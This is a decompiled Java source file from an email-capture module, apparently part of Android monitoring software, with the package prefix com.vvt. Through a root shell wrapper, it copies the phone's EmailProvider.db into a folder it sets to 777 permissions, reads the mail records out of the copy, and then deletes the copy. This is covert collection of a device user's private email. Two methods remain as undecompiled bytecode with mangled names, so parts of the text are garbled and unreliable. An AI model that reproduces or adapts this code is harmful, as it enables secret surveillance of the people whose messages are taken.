package com.vvt.capture.email.generic.a;

import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.a.d;
import com.vvt.capture.email.generic.EmailEventReference;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final boolean c = com.vvt.ak.a.d;
  private String d;
  private d e;
  private long f = 0L;
  private String g = null;
  
  private String b()
  {
    return com.vvt.capture.email.generic.b.b(this.d);
  }
  
  private String c()
  {
    return com.vvt.capture.email.generic.b.a(this.d);
  }
  
  private void d()
  {
    String str1 = c();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    l1 = 0L;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject = null;
    EmailEventReference localEmailEventReference = new com/vvt/capture/email/generic/EmailEventReference;
    localEmailEventReference.<init>();
    try
    {
      localObject = com.vvt.capture.email.generic.b.a();
      bool2 = a;
      if (bool2) {}
      String str1 = "EmailProvider.db";
      String str2 = this.g;
      str1 = a(str1, (String)localObject, str2);
      boolean bool3 = com.vvt.ag.b.a(str1);
      if (bool3) {
        break label188;
      }
      l2 = com.vvt.capture.email.generic.b.c(str1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4;
        boolean bool2 = b;
        if (bool2) {}
        long l2 = l1;
        continue;
        this.f = l2;
        continue;
        l2 = l1;
      }
    }
    d();
    bool4 = l2 < l1;
    if (!bool4)
    {
      bool2 = c;
      if (bool2) {}
      l2 = this.f;
      if (localObject == null) {
        localObject = "";
      }
      localEmailEventReference.setDatabasePath((String)localObject);
      localObject = Long.valueOf(l2);
      localEmailEventReference.setReference((Long)localObject);
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return localEmailEventReference;
    }
  }
  
  public String a(String paramString1, String paramString2, String paramString3)
  {
    bool1 = ShellUtil.b(paramString2);
    Object localObject1 = c();
    String str1 = p.a((String)localObject1, paramString1);
    String str2;
    int i;
    if (bool1)
    {
      str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      i = 5;
    }
    for (;;)
    {
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str3 = null;
        arrayOfObject[0] = localObject1;
        j = 1;
        arrayOfObject[j] = localObject1;
        j = 2;
        arrayOfObject[j] = paramString3;
        j = 3;
        arrayOfObject[j] = paramString3;
        j = 4;
        arrayOfObject[j] = localObject1;
        str2 = String.format(str2, arrayOfObject);
        KMShell.a(str2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k((String)localObject1);
        }
        str2 = "%s cp -f %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject1 = new Object[k];
        i = 0;
        arrayOfObject = null;
        str3 = b();
        localObject1[0] = str3;
        i = 1;
        localObject1[i] = paramString2;
        i = 2;
        localObject1[i] = str1;
        i = 3;
        localObject1[i] = str1;
        i = 4;
        localObject1[i] = paramString3;
        i = 5;
        localObject1[i] = paramString3;
        i = 6;
        localObject1[i] = str1;
        str2 = String.format(str2, (Object[])localObject1);
        KMShell.a(str2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k(paramString2);
        }
        bool1 = a;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        boolean bool2 = false;
        Object localObject2 = null;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      return str1;
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      str1 = null;
    }
  }
  
  /* Error */
  public java.util.List a(int paramInt)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: new 133	java/util/ArrayList
    //   13: astore 4
    //   15: aload 4
    //   17: invokespecial 134	java/util/ArrayList:<init>	()V
    //   20: invokestatic 69	com/vvt/capture/email/generic/removeFromPath:a	()Ljava/lang/String;
    //   23: astore 5
    //   25: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   28: istore 6
    //   30: iload 6
    //   32: ifeq +3 -> 35
    //   35: ldc 71
    //   37: astore 7
    //   39: aload_0
    //   40: getfield 38	com/vvt/capture/email/generic/a/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   43: astore 8
    //   45: aload_0
    //   46: aload 7
    //   48: aload 5
    //   50: aload 8
    //   52: invokevirtual 74	com/vvt/capture/email/generic/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   55: astore 5
    //   57: aload 5
    //   59: invokestatic 106	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   62: pop
    //   63: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   66: istore 6
    //   68: iload 6
    //   70: ifeq +3 -> 73
    //   73: invokestatic 135	com/vvt/capture/email/generic/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   76: astore 7
    //   78: ldc -119
    //   80: astore 8
    //   82: aload_0
    //   83: getfield 38	com/vvt/capture/email/generic/a/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   86: astore 9
    //   88: aload_0
    //   89: aload 8
    //   91: aload 7
    //   93: aload 9
    //   95: invokevirtual 74	com/vvt/capture/email/generic/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   98: astore 10
    //   100: aload 10
    //   102: invokestatic 106	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   105: pop
    //   106: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   109: istore 6
    //   111: iload 6
    //   113: ifeq +3 -> 116
    //   116: aload 5
    //   118: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   121: istore 6
    //   123: iload 6
    //   125: ifne +255 -> 380
    //   128: aload 10
    //   130: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   133: istore 6
    //   135: iload 6
    //   137: ifne +243 -> 380
    //   140: iload_1
    //   141: aload 5
    //   143: invokestatic 140	com/vvt/capture/email/generic/removeFromPath:a	(ILjava/lang/String;)J
    //   146: lstore 11
    //   148: lconst_1
    //   149: lstore 13
    //   151: lload 11
    //   153: lload 13
    //   155: lsub
    //   156: lstore 11
    //   158: aload 5
    //   160: invokestatic 82	com/vvt/capture/email/generic/removeFromPath:MyUncaughtExceptionHandler	(Ljava/lang/String;)J
    //   163: lstore 13
    //   165: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   168: istore 15
    //   170: iload 15
    //   172: ifeq +3 -> 175
    //   175: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   178: istore 15
    //   180: iload 15
    //   182: ifeq +3 -> 185
    //   185: bipush 17
    //   187: istore 15
    //   189: iload 15
    //   191: aload 5
    //   193: invokestatic 148	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   196: astore 5
    //   198: bipush 17
    //   200: istore 15
    //   202: iload 15
    //   204: aload 10
    //   206: invokestatic 148	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   209: astore_2
    //   210: aload_0
    //   211: getfield 40	com/vvt/capture/email/generic/a/removeFromPath:d	Ljava/lang/String;
    //   214: astore 10
    //   216: aload_0
    //   217: getfield 38	com/vvt/capture/email/generic/a/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   220: astore 16
    //   222: aload 5
    //   224: aload_2
    //   225: lload 11
    //   227: lload 13
    //   229: aload 10
    //   231: aload 16
    //   233: invokestatic 151	com/vvt/capture/email/generic/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Landroid/database/sqlite/SQLiteDatabase;JJLjava/lang/String;Ljava/lang/String;)Ljava/util/List;
    //   236: astore 7
    //   238: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   241: istore 17
    //   243: iload 17
    //   245: ifeq +3 -> 248
    //   248: aload 4
    //   250: aload 7
    //   252: invokeinterface 157 2 0
    //   257: pop
    //   258: aload_0
    //   259: invokespecial 84	com/vvt/capture/email/generic/a/removeFromPath:d	()V
    //   262: aload 5
    //   264: ifnull +8 -> 272
    //   267: aload 5
    //   269: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   272: aload_2
    //   273: ifnull +7 -> 280
    //   276: aload_2
    //   277: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   280: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   283: istore_3
    //   284: iload_3
    //   285: ifeq +3 -> 288
    //   288: aload 4
    //   290: areturn
    //   291: astore 5
    //   293: iconst_0
    //   294: istore_3
    //   295: aconst_null
    //   296: astore 5
    //   298: getstatic 26	com/vvt/capture/email/generic/a/removeFromPath:removeFromPath	Z
    //   301: istore 6
    //   303: iload 6
    //   305: ifeq +3 -> 308
    //   308: aload_0
    //   309: invokespecial 84	com/vvt/capture/email/generic/a/removeFromPath:d	()V
    //   312: aload 5
    //   314: ifnull +8 -> 322
    //   317: aload 5
    //   319: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   322: aload_2
    //   323: ifnull -43 -> 280
    //   326: goto -50 -> 276
    //   329: astore 5
    //   331: iconst_0
    //   332: istore 6
    //   334: aconst_null
    //   335: astore 7
    //   337: aload_0
    //   338: invokespecial 84	com/vvt/capture/email/generic/a/removeFromPath:d	()V
    //   341: aload 7
    //   343: ifnull +8 -> 351
    //   346: aload 7
    //   348: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   351: aload_2
    //   352: ifnull +7 -> 359
    //   355: aload_2
    //   356: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   359: aload 5
    //   361: athrow
    //   362: astore 18
    //   364: aload 5
    //   366: astore 7
    //   368: aload 18
    //   370: astore 5
    //   372: goto -35 -> 337
    //   375: astore 7
    //   377: goto -79 -> 298
    //   380: iconst_0
    //   381: istore_3
    //   382: aconst_null
    //   383: astore 5
    //   385: goto -127 -> 258
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	388	0	this	removeFromPath
    //   0	388	1	paramInt	int
    //   1	355	2	localSQLiteDatabase	android.database.sqlite.SQLiteDatabase
    //   5	377	3	bool1	boolean
    //   13	276	4	localArrayList	java.util.ArrayList
    //   23	245	5	localObject1	Object
    //   291	1	5	localException1	Exception
    //   296	22	5	localObject2	Object
    //   329	36	5	localObject3	Object
    //   370	14	5	localObject4	Object
    //   28	305	6	bool2	boolean
    //   37	330	7	localObject5	Object
    //   375	1	7	localException2	Exception
    //   43	47	8	str1	String
    //   86	8	9	str2	String
    //   98	132	10	str3	String
    //   146	80	11	l1	long
    //   149	79	13	l2	long
    //   168	13	15	bool3	boolean
    //   187	16	15	i	int
    //   220	12	16	str4	String
    //   241	3	17	bool4	boolean
    //   362	7	18	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   20	23	291	java/lang/Exception
    //   25	28	291	java/lang/Exception
    //   39	43	291	java/lang/Exception
    //   50	55	291	java/lang/Exception
    //   57	63	291	java/lang/Exception
    //   63	66	291	java/lang/Exception
    //   73	76	291	java/lang/Exception
    //   82	86	291	java/lang/Exception
    //   93	98	291	java/lang/Exception
    //   100	106	291	java/lang/Exception
    //   106	109	291	java/lang/Exception
    //   116	121	291	java/lang/Exception
    //   128	133	291	java/lang/Exception
    //   141	146	291	java/lang/Exception
    //   158	163	291	java/lang/Exception
    //   165	168	291	java/lang/Exception
    //   175	178	291	java/lang/Exception
    //   191	196	291	java/lang/Exception
    //   20	23	329	finally
    //   25	28	329	finally
    //   39	43	329	finally
    //   50	55	329	finally
    //   57	63	329	finally
    //   63	66	329	finally
    //   73	76	329	finally
    //   82	86	329	finally
    //   93	98	329	finally
    //   100	106	329	finally
    //   106	109	329	finally
    //   116	121	329	finally
    //   128	133	329	finally
    //   141	146	329	finally
    //   158	163	329	finally
    //   165	168	329	finally
    //   175	178	329	finally
    //   191	196	329	finally
    //   204	209	362	finally
    //   210	214	362	finally
    //   216	220	362	finally
    //   231	236	362	finally
    //   238	241	362	finally
    //   250	258	362	finally
    //   298	301	362	finally
    //   204	209	375	java/lang/Exception
    //   210	214	375	java/lang/Exception
    //   216	220	375	java/lang/Exception
    //   231	236	375	java/lang/Exception
    //   238	241	375	java/lang/Exception
    //   250	258	375	java/lang/Exception
  }
  
  /* Error */
  public java.util.List a(g paramg1, g paramg2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   5: istore 4
    //   7: iload 4
    //   9: ifeq +3 -> 12
    //   12: new 133	java/util/ArrayList
    //   15: astore 5
    //   17: aload 5
    //   19: invokespecial 134	java/util/ArrayList:<init>	()V
    //   22: aload_1
    //   23: instanceof 66
    //   26: istore 4
    //   28: iload 4
    //   30: ifeq +312 -> 342
    //   33: aload_1
    //   34: checkcast 66	com/vvt/capture/email/generic/EmailEventReference
    //   37: astore_1
    //   38: aload_1
    //   39: invokevirtual 166	com/vvt/capture/email/generic/EmailEventReference:getReference	()Ljava/lang/Long;
    //   42: astore 6
    //   44: aload 6
    //   46: invokevirtual 170	java/lang/Long:longValue	()J
    //   49: lstore 7
    //   51: aload_2
    //   52: checkcast 66	com/vvt/capture/email/generic/EmailEventReference
    //   55: astore_2
    //   56: aload_2
    //   57: invokevirtual 166	com/vvt/capture/email/generic/EmailEventReference:getReference	()Ljava/lang/Long;
    //   60: astore 6
    //   62: aload 6
    //   64: invokevirtual 170	java/lang/Long:longValue	()J
    //   67: lstore 9
    //   69: lload 9
    //   71: lload 7
    //   73: lsub
    //   74: lstore 11
    //   76: lconst_0
    //   77: lstore 13
    //   79: lload 7
    //   81: lload 13
    //   83: lcmp
    //   84: istore 4
    //   86: iload 4
    //   88: ifeq +19 -> 107
    //   91: iconst_3
    //   92: i2l
    //   93: lstore 13
    //   95: lload 11
    //   97: lload 13
    //   99: lcmp
    //   100: istore 4
    //   102: iload 4
    //   104: ifle +13 -> 117
    //   107: ldc2_w 173
    //   110: lstore 11
    //   112: lload 11
    //   114: invokestatic 182	android/os/SystemClock:sleep	(J)V
    //   117: invokestatic 69	com/vvt/capture/email/generic/removeFromPath:a	()Ljava/lang/String;
    //   120: astore 6
    //   122: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   125: istore 15
    //   127: iload 15
    //   129: ifeq +3 -> 132
    //   132: ldc 71
    //   134: astore 16
    //   136: aload_0
    //   137: getfield 38	com/vvt/capture/email/generic/a/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   140: astore 17
    //   142: aload_0
    //   143: aload 16
    //   145: aload 6
    //   147: aload 17
    //   149: invokevirtual 74	com/vvt/capture/email/generic/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   152: astore 6
    //   154: aload 6
    //   156: invokestatic 106	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   159: pop
    //   160: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   163: istore 15
    //   165: iload 15
    //   167: ifeq +3 -> 170
    //   170: invokestatic 135	com/vvt/capture/email/generic/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   173: astore 16
    //   175: ldc -119
    //   177: astore 17
    //   179: aload_0
    //   180: getfield 38	com/vvt/capture/email/generic/a/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   183: astore 18
    //   185: aload_0
    //   186: aload 17
    //   188: aload 16
    //   190: aload 18
    //   192: invokevirtual 74	com/vvt/capture/email/generic/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   195: astore 16
    //   197: aload 16
    //   199: invokestatic 106	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   202: pop
    //   203: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   206: istore 19
    //   208: iload 19
    //   210: ifeq +3 -> 213
    //   213: aload 6
    //   215: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   218: istore 19
    //   220: iload 19
    //   222: ifne +216 -> 438
    //   225: aload 16
    //   227: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   230: istore 19
    //   232: iload 19
    //   234: ifne +204 -> 438
    //   237: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   240: istore 19
    //   242: iload 19
    //   244: ifeq +3 -> 247
    //   247: bipush 17
    //   249: istore 19
    //   251: iload 19
    //   253: aload 6
    //   255: invokestatic 148	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   258: astore 6
    //   260: bipush 17
    //   262: istore 19
    //   264: iload 19
    //   266: aload 16
    //   268: invokestatic 148	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   271: astore_3
    //   272: aload_0
    //   273: getfield 40	com/vvt/capture/email/generic/a/removeFromPath:d	Ljava/lang/String;
    //   276: astore 16
    //   278: aload_0
    //   279: getfield 38	com/vvt/capture/email/generic/a/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   282: astore 17
    //   284: aload 6
    //   286: aload_3
    //   287: lload 7
    //   289: lload 9
    //   291: aload 16
    //   293: aload 17
    //   295: invokestatic 151	com/vvt/capture/email/generic/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Landroid/database/sqlite/SQLiteDatabase;JJLjava/lang/String;Ljava/lang/String;)Ljava/util/List;
    //   298: astore 20
    //   300: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   303: istore 21
    //   305: iload 21
    //   307: ifeq +3 -> 310
    //   310: aload 5
    //   312: aload 20
    //   314: invokeinterface 157 2 0
    //   319: pop
    //   320: aload 6
    //   322: ifnull +8 -> 330
    //   325: aload 6
    //   327: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   330: aload_3
    //   331: ifnull +7 -> 338
    //   334: aload_3
    //   335: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   338: aload_0
    //   339: invokespecial 84	com/vvt/capture/email/generic/a/removeFromPath:d	()V
    //   342: getstatic 22	com/vvt/capture/email/generic/a/removeFromPath:a	Z
    //   345: istore 4
    //   347: iload 4
    //   349: ifeq +3 -> 352
    //   352: aload 5
    //   354: areturn
    //   355: astore 6
    //   357: iconst_0
    //   358: istore 4
    //   360: aconst_null
    //   361: astore 6
    //   363: getstatic 26	com/vvt/capture/email/generic/a/removeFromPath:removeFromPath	Z
    //   366: istore 22
    //   368: iload 22
    //   370: ifeq +3 -> 373
    //   373: aload 6
    //   375: ifnull +8 -> 383
    //   378: aload 6
    //   380: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   383: aload_3
    //   384: ifnull -46 -> 338
    //   387: aload_3
    //   388: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   391: goto -53 -> 338
    //   394: astore 6
    //   396: getstatic 26	com/vvt/capture/email/generic/a/removeFromPath:removeFromPath	Z
    //   399: istore 4
    //   401: iload 4
    //   403: ifeq -61 -> 342
    //   406: goto -64 -> 342
    //   409: astore 6
    //   411: iconst_0
    //   412: istore 22
    //   414: aconst_null
    //   415: astore 20
    //   417: aload 20
    //   419: ifnull +8 -> 427
    //   422: aload 20
    //   424: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   427: aload_3
    //   428: ifnull +7 -> 435
    //   431: aload_3
    //   432: invokevirtual 162	android/database/sqlite/SQLiteDatabase:close	()V
    //   435: aload 6
    //   437: athrow
    //   438: getstatic 26	com/vvt/capture/email/generic/a/removeFromPath:removeFromPath	Z
    //   441: istore 4
    //   443: iload 4
    //   445: ifeq -107 -> 338
    //   448: goto -110 -> 338
    //   451: astore 23
    //   453: aload 6
    //   455: astore 20
    //   457: aload 23
    //   459: astore 6
    //   461: goto -44 -> 417
    //   464: astore 20
    //   466: goto -103 -> 363
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	469	0	this	removeFromPath
    //   0	469	1	paramg1	FxFileObserverWorker
    //   0	469	2	paramg2	FxFileObserverWorker
    //   1	431	3	localSQLiteDatabase	android.database.sqlite.SQLiteDatabase
    //   5	439	4	bool1	boolean
    //   15	338	5	localArrayList	java.util.ArrayList
    //   42	284	6	localObject1	Object
    //   355	1	6	localException1	Exception
    //   361	18	6	localObject2	Object
    //   394	1	6	localException2	Exception
    //   409	45	6	localObject3	Object
    //   459	1	6	localObject4	Object
    //   49	239	7	l1	long
    //   67	223	9	l2	long
    //   74	39	11	l3	long
    //   77	21	13	l4	long
    //   125	41	15	bool2	boolean
    //   134	158	16	str1	String
    //   140	154	17	str2	String
    //   183	8	18	str3	String
    //   206	37	19	bool3	boolean
    //   249	16	19	i	int
    //   298	158	20	localObject5	Object
    //   464	1	20	localException3	Exception
    //   303	3	21	bool4	boolean
    //   366	47	22	bool5	boolean
    //   451	7	23	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   253	258	355	java/lang/Exception
    //   33	37	394	java/lang/Exception
    //   38	42	394	java/lang/Exception
    //   44	49	394	java/lang/Exception
    //   51	55	394	java/lang/Exception
    //   56	60	394	java/lang/Exception
    //   62	67	394	java/lang/Exception
    //   112	117	394	java/lang/Exception
    //   117	120	394	java/lang/Exception
    //   122	125	394	java/lang/Exception
    //   136	140	394	java/lang/Exception
    //   147	152	394	java/lang/Exception
    //   154	160	394	java/lang/Exception
    //   160	163	394	java/lang/Exception
    //   170	173	394	java/lang/Exception
    //   179	183	394	java/lang/Exception
    //   190	195	394	java/lang/Exception
    //   197	203	394	java/lang/Exception
    //   203	206	394	java/lang/Exception
    //   213	218	394	java/lang/Exception
    //   225	230	394	java/lang/Exception
    //   237	240	394	java/lang/Exception
    //   325	330	394	java/lang/Exception
    //   334	338	394	java/lang/Exception
    //   338	342	394	java/lang/Exception
    //   378	383	394	java/lang/Exception
    //   387	391	394	java/lang/Exception
    //   422	427	394	java/lang/Exception
    //   431	435	394	java/lang/Exception
    //   435	438	394	java/lang/Exception
    //   438	441	394	java/lang/Exception
    //   253	258	409	finally
    //   266	271	451	finally
    //   272	276	451	finally
    //   278	282	451	finally
    //   293	298	451	finally
    //   300	303	451	finally
    //   312	320	451	finally
    //   363	366	451	finally
    //   266	271	464	java/lang/Exception
    //   272	276	464	java/lang/Exception
    //   278	282	464	java/lang/Exception
    //   293	298	464	java/lang/Exception
    //   300	303	464	java/lang/Exception
    //   312	320	464	java/lang/Exception
  }
  
  public void a(d paramd)
  {
    this.e = paramd;
  }
  
  public void a(String paramString)
  {
    this.d = paramString;
  }
  
  public void b(String paramString)
  {
    this.g = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/generic/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */